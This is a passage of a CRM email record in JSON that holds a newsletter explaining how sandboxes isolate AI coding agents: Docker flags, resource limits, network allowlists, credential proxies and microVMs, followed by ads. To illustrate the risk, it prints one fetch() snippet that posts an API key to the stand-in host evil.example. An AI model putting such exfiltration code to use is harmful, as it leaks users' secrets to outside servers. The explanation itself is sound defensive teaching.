\"center\\\" style=\\\"display:table !important;\\\"><tbody><tr style=\\\"display:table-row !important;\\\"><td class=\\\"u\\\" align=\\\"center\\\" valign=\\\"middle\\\" height=\\\"32\\\" style=\\\"height:32px;display:table-cell !important; max-height: 32px !important;margin:0px !important; background-color: #ffffff !important;\\\"><a style=\\\"line-height:32px !important;text-decoration:none;display:block !important;\\\" href=\\\"https://link.mail.beehiiv.\\\"><img width=\\\"16\\\" height=\\\"16\\\" alt=\\\"beehiiv logo\\\" style=\\\"display:inline-block !important;max-width:16px !important;vertical-align:-3px !important;width:16px !important;height:16px !important;\\\" border=\\\"0\\\" src=\\\"https://media.beehiiv.com/cdn-cgi/image/fit=pad,format=png,onerror=redirect,quality=100,width=16,height=16,gravity=center,background=transparent,dpr=2/output-onlinepngtools.png\\\"><span style=\\\"padding-left:11px !important;display: inline-block !important;\\\">Powered by beehiiv</span></a></td></tr></tbody></table></td></tr><tr><td align=\\\"left\\\" valign=\\\"top\\\" height=\\\"2\\\" style=\\\"height:2px;line-height:1px;font-size:1px;\\\"><a href=\\\"https://hp.beehiiv.com/1ecd4f85-bc08-4bd0-a10f-628117366dd4\\\" style=\\\"color: #030712 !important; cursor: default; font-size: 1px; text-decoration: none;\\\"></a></td></tr><tr><td align=\\\"left\\\" valign=\\\"top\\\" height=\\\"2\\\" style=\\\"height:2px;\\\"><a href=\\\"https://email.beehiivstatus.com/d6de1a1e97573bcb371f95f0f8327deb1446e4d7/hclick\\\" style=\\\"color: #030712 !important; cursor: default; font-size: 1px; text-decoration: none;\\\"></a></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></div>\",\n \"creation\": \"2026-10-17 16:11:52.705553\",\n \"delivery_status\": \"\",\n \"docstatus\": 0,\n \"doctype\": \"Communication\",\n \"email_account\": \"sales\",\n \"email_status\": \"Open\",\n \"email_template\": null,\n \"feedback_request\": null,\n \"has_attachment\": 0,\n \"idx\": 0,\n \"imap_folder\": null,\n \"in_reply_to\": null,\n \"message_id\": \"20260928.125653.3c7eda5a@mta13\",\n \"modified\": \"2026-10-17 16:11:52.906623\",\n \"modified_by\": \"Administrator\",\n \"name\": \"ab7qp9u5nq\",\n \"owner\": \"Administrator\",\n \"phone_no\": null,\n \"rating\": 0,\n \"read_by_recipient\": 0,\n \"read_by_recipient_on\": null,\n \"read_receipt\": 0,\n \"recipients\": \"\\\"raiaayushhectocorn2029@gmail.com\\\" <raiaayushhectocorn2029@gmail.com>\",\n \"reference_doctype\": \"CRM Lead\",\n \"reference_name\": \"CRM-LEAD-2026-00058\",\n \"reference_owner\": \"Administrator\",\n \"seen\": 0,\n \"send_after\": null,\n \"sender\": \"vaibhav@outskillwithai.com\",\n \"sender_full_name\": \"Vaibhav Sisinty\",\n \"sent_or_received\": \"Received\",\n \"status\": \"Linked\",\n \"subject\": \"WTH is agent sandbox?\",\n \"text_content\": \"----------\\nView image: (https://media.beehiiv.com/cdn-cgi/image/fit=scale-down,format=auto,onerror=redirect,quality=80/uploads/asset/file/06e9e26b-31e3-41b9-8d33-1e4fc1dccda7/Frame_2147225035.png?t=1785742897)\\nCaption: \\n\\n\\n--------------------\\n\\n\\n\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\n\\n\\nGiving an AI agent a shell takes one line of code, exec(agentOutput), and with that line it can run your tests, install packages, edit files and spin up servers.\\n\\nIt can also read anything on your machine and send your API keys somewhere you\'ll never find out about.\\n\\nThat\'s why coding agents live inside sandboxes, and I realised I\'d been using that word for months without really knowing what it covers.\\n\\nSo this week I pulled one apart, layer by layer, starting from a single Docker command.\\n\\n**But first:**\\n\\n\\n--------------------\\n\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\n\\n\\n--------------------\\n## **Tools That Caught My Attention**\\n\\n\\n--------------------\\n\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\n\\n\\n--------------------\\n[OpenAI Sandbox Agents](https://developers.openai.com/api/docs/guides/agents/sandboxes): Gives an agent an isolated Unix-like workspace with files, a shell, packages, ports and snapshots, so it can pick up where it left off.\\n\\n[Daytona](https://www.daytona.io/)**:** Infrastructure for running agent code, with dedicated compute, networking, snapshots and credential brokering.\\n\\n[Firecracker](https://firecracker-microvm.github.io/)**:** A lower-level microVM runtime, worth reading about if you want to see how stronger isolation gets built.\\n\\n\\n----------\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\n\\n----------\\n## **How Agent Sandboxes Work**\\n\\n\\n--------------------\\n\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\n\\n\\n--------------------\\nThe easiest way I\'ve found to think about a sandbox is as a spare laptop you hand to the agent. It gets a shell, a filesystem, packages and some internet, and your actual machine stays out of reach.\\n\\nMost of that spare laptop can be set up with one Docker command. Say the agent wants to run npm test. Instead of running it on your machine, your app does this:\\n\\n```\\ndocker run --rm \\\\\\n  --memory 512m --cpus 1 \\\\\\n  --network none --read-only \\\\\\n  --cap-drop ALL --tmpfs /tmp \\\\\\n  -e npm_config_cache=/tmp/.npm \\\\\\n  -v \\\"$PWD:/workspace\\\" -w /workspace \\\\\\n  node:24-alpine sh -lc \\\"npm test\\\"\\n\\n```\\nEvery flag in there is doing a job, and between them they cover most of what a sandbox is.\\n\\n#### **1. Its own filesystem.**\\n\\nInside the container, / isn\'t your laptop, so the agent can delete, install and make a mess without touching anything.\\n\\nIf it needs your repo you can copy it in or mount just that folder, and for throwaway jobs copying is safer, since a mounted folder is still your real folder.\\n\\n\\n\\nView image: (https://media.beehiiv.com/cdn-cgi/image/fit=scale-down,format=auto,onerror=redirect,quality=80/uploads/asset/file/ff2b041b-5d07-474a-8326-db09f7b5f353/Frame_2147225150.png?t=1790588794)\\nCaption: \\n\\n\\n\\n#### **2. Limits on what it can burn.**\\n\\nBeing isolated won\'t stop an agent from writing a loop that eats memory forever or pins every CPU core, which is where --memory and --cpus come in.\\n\\nAdd a timeout as well, so a command that\'s still running after 30 seconds takes the whole sandbox down with it.\\n\\n#### **3. A wall around the network.**\\n\\nThis is the one I\'d have missed. A package the agent installs could have this buried somewhere inside:\\n\\n```\\nfetch(\\\"https://evil.example\\\", {\\n  method: \\\"POST\\\",\\n  body: process.env.API_KEY\\n})\\n```\\nThat code never has to break out of anything, it just posts your key to someone else\'s server.\\n\\n--network none stops it, and since most agents do need the internet, production setups use an allowlist instead, so GitHub, npm and your model\'s API get through and random-server.xyz doesn\'t.\\n\\n#### **4. Keys that never go in.**\\n\\nForwarding your whole environment into the sandbox is a very common shortcut, and it hands every key you own to code you didn\'t write.\\n\\n[Daytona\'s fix](https://www.daytona.io/docs/en/secrets/)_ was my favourite thing I read while putting this together._\\n\\nThe sandbox only ever gets a fake placeholder, and a proxy sitting outside swaps in the real key when a request heads to an approved API.\\n\\n\\n\\nView image: (https://media.beehiiv.com/cdn-cgi/image/fit=scale-down,format=auto,onerror=redirect,quality=80/uploads/asset/file/e36a77ae-5b82-4012-b873-3c7b57de3335/Frame_2147225152.png?t=1790589027)\\nCaption: \\n\\n\\n\\nSo even if the code goes rogue, it can use the key without ever seeing it.\\n\\n**5. A kernel of its own.**\\n\\nContainers keep files, processes and networking apart, and yet all of them run on the same host kernel.\\u00a0\\n\\n[Docker trims](https://docs.docker.com/engine/security/seccomp/) what a container can ask that kernel for, and for riskier work you give each sandbox its own kernel inside a tiny VM.\\n\\nTheir AI sandboxes [now work this way](https://www.docker.com/blog/why-microvms-the-architecture-behind-docker-sandboxes/) on a VM layer Docker built itself, and Firecracker, the microVM that powers AWS Lambda, is the best-known open-source way to build the same thing.\\n\\nOn top of all that, a sandbox has to remember things.\\n\\nBy your second message the agent may have cloned the repo, installed everything and read 200 files, and nobody wants to redo that every time.\\n\\nSnapshots [save that state and bring it back later](https://www.daytona.io/docs/en/snapshots/) (Daytona and OpenAI both support them), which makes the sandbox feel a lot like the agent\'s own little computer.\\n\\n\\n\\nView image: (https://media.beehiiv.com/cdn-cgi/image/fit=scale-down,format=auto,onerror=redirect,quality=80/uploads/asset/file/1eeed7fe-da95-40a7-a9e7-cf16ada9f71c/Frame_2147225151.png?t=1790589059)\\nCaption: \\n\\n\\n\\nIf you want to play with this locally, the Docker command above plus a small function your agent calls instead of exec gets you surprisingly far.\\n\\nIt still shares your kernel and has no proxy or allowlist, so treat it as a way to understand the idea rather than something to ship.\\n\\n\\n----------\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\n\\n----------\\n## **My take**\\n\\n\\n--------------------\\n\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\u2014\\n\\n\\n--------------------\\nWe spend most of our agent conversations arguing about models.\\n\\nOnce an agent can run code, though, the box it runs in matters just as much, because the model decides what it wants to do and the sandbox decides how much of that happens.\\n\\nThese days when I try a new agent product, I go looking for how its sandbox works pretty early.\\n\\n**Which files it sees, which servers it can reach, how long it can run and whether it ever holds a real key tell me more about how far I can trust it than any benchmark does.**\\n\\nUntil next time, \\nVaibhav \\ud83e\\udd1d\\n\\n\\n--------------------\\n**If you read till here, you might find this interesting**\\n\\n**#AD 1**\\n\\n### The best in influencer marketing. And you\\u2019re invited.\\n\\nView image: (https://media.beehiiv.com/cdn-cgi/image/fit=scale-down,format=auto,onerror=redirect,quality=80/uploads/asset/file/f6902b0f-be12-4b60-8cc2-cb918899c78d/Primary_2__1_.png?t=1787929104)\\nFollow image link: (https://www.modash.io/roi26?utm_source=beehiiv&utm_medium=8AWZ8QR5IO&utm_campaign=roi26&_bhiiv=opp_640a3592-03d3-47aa-96da-30e5a554c62b_aa63a2a9&bhcl_id=a4bc3636-4cef-4231-8cdf-925cb2764ba8_1ecd4f85-bc08-4bd0-a10f-628117366dd4_ef7bc386-7a60-4bb7-a72a-41016dc7825b)\\nCaption: \\n\\nGet ready for [Return on Influence Festival \'26](https://www.modash.io/roi26?utm_source=beehiiv&utm_medium=8AWZ8QR5IO&utm_campaign=roi26&_bhiiv=opp_640a3592-03d3-47aa-96da-30e5a554c62b_aa63a2a9&bhcl_id=a4bc3636-4cef-4231-8cdf-925cb2764ba8_1ecd4f85-bc08-4bd0-a10f-628117366dd4_ef7bc386-7a60-4bb7-a72a-41016dc7825b). An entire day dedicated to influencer marketing with speakers running some of the best programs in the world.\\u00a0\\n\\nAlready booked:\\u00a0\\n\\n* Maya Shaff, \\u014cURA\\n\\n* Leah Walker, Adobe\\n\\n* Georgia Humphries, Stanley 1913\\n\\n* Tyler Vaught, Edelman\\n\\n* Josh Rangel, Ogilvy\\u00a0\\n\\nand many more to be announced soon\\u2026\\n\\nIt\\u2019s free, it\\u2019s online, and you\\u2019ll take away something you can apply to your job the very next day. Scout\\u2019s honor!\\n\\n_[Save your spot now](https://www.modash.io/roi26?utm_source=beehiiv&utm_medium=8AWZ8QR5IO&utm_campaign=roi26&_bhiiv=opp_640a3592-03d3-47aa-96da-30e5a554c62b_aa63a2a9&bhcl_id=a4bc3636-4cef-4231-8cdf-925cb2764ba8_1ecd4f85-bc08-4bd0-a10f-628117366dd4_ef7bc386-7a60-4bb7-a72a-41016dc7825b)_\\n\\n**#AD 2**\\n\\n### 100+ coding prompts top engineers use to ship 5X faster\\n\\nView image: (https://media.beehiiv.com/cdn-cgi/image/fit=scale-down,format=auto,onerror=redirect,quality=80/uploads/asset/file/b91de6be-ecbd-4466-94fd-901058f5cac1/100%2B_Prompts_for_AI-Assisted_Coding_Beehiiv_Ad_Creatives_-_27th_August_2026_V3.jpg?t=1787937805)\\nFollow image link: (https://magic.beehiiv.com/v1/5f7ce6e3-9a71-416b-99a7-606c5f7e2447?email=raiaayushhectocorn2029@gmail.com&redirect_to=https%3A%2F%2Fcodenewsletter.ai%2Fforms%2F14166360-de71-46c4-8722-878d417fab5c&utm_source=beehiiv&utm_campaign=8AWZ8QR5IO&redirect_delay=3&_bhiiv=opp_8d3078fe-b0c9-4ae8-aca0-1cfe0d357e00_94e90c2e&bhcl_id=0185f9a5-1f00-4078-b2f4-bfab1f00d1fa_1ecd4f85-bc08-4bd0-a10f-628117366dd4_ef7bc386-7a60-4bb7-a72a-41016dc7825b)\\nCaption: \\n\\nClaude Code, Codex, and Cursor are on every engineer\'s stack. Most still treat them like a search bar. Top engineers work from a system, these 100+ prompts are that system. Sign up for [The Code](https://magic.beehiiv.com/v1/5f7ce6e3-9a71-416b-99a7-606c5f7e2447?email=raiaayushhectocorn2029@gmail.com&redirect_to=https%3A%2F%2Fcodenewsletter.ai%2Fforms%2F14166360-de71-46c4-8722-878d417fab5c&utm_source=beehiiv&utm_campaign=8AWZ8QR5IO&redirect_delay=3&_bhiiv=opp_8d3078fe-b0c9-4ae8-aca0-1cfe0d357e00_94e90c2e&bhcl_id=0185f9a5-1f00-4078-b2f4-bfab1f00d1fa_1ecd4f85-bc08-4bd0-a10f-628117366dd4_ef7bc386-7a60-4bb7-a72a-41016dc7825b) and get the prompts free, plus a 5-minute daily newsletter to keep sharpening your edge.\\n\\n[Claim your free prompts](https://magic.beehiiv.com/v1/5f7ce6e3-9a71-416b-99a7-606c5f7e2447?email=raiaayushhectocorn2029@gmail.com&redirect_to=https%3A%2F%2Fcodenewsletter.ai%2Fforms%2F14166360-de71-46c4-8722-878d417fab5c&utm_source=beehiiv&utm_campaign=8AWZ8QR5IO&redirect_delay=3&_bhiiv=opp_8d3078fe-b0c9-4ae8-aca0-1cfe0d357e00_94e90c2e&bhcl_id=0185f9a5-1f00-4078-b2f4-bfab1f00d1fa_1ecd4f85-bc08-4bd0-a10f-628117366dd4_ef7bc386-7a60-4bb7-a72a-41016dc7825b)\\n\\n\\n----------\\n\\u2014\\u2014\\u2014\\n\\nYou are reading a plain text version of this post. For the best experience, copy and paste this link in your browser to view the post online:\\nhttps://newsletter.stayingahead.com/p/how-agent-sandboxes-work\",\n \"timeline_links\": [\n  {\n   \"communication_date\": \"2026-09-28 18:26:53\",\n   \"creation\": \"2026-10-17 16:11:53.022864\",\n   \"docstatus\": 0,\n   \"doctype\": \"Communication Link\",\n   \"idx\": 1,\n   \"link_doctype\": \"Contact\",\n   \"link_name\": \"Vaibhav\",\n   \"link_title\": \"\",\n   \"modified\": \"2026-10-17 16:11:53.022864\",\n   \"modified_by\": \"Administrator\",\n   \"name\": \"aba97s5sq7\",\n   \"owner\": \"Administrator\",\n   \"parent\": \"ab7qp9u5nq\",\n   \"parentfield\": \"timeline_links\",\n   \"parenttype\": \"Communication\"\n  },\n  {\n   \"communication_date\": \"2026-09-28 18:26:53\",\n   \"creation\": \"2026-10-17 16:11:53.023367\",\n   \"docstatus\": 0,\n   \"doctype\": \"Communication Link\",\n   \"idx\": 2,\n   \"link_doctype\": \"Contact\",\n   \"link_name\": \"Raiaayushhectocorn2029\",\n   \"link_title\": \"\",\n   \"mod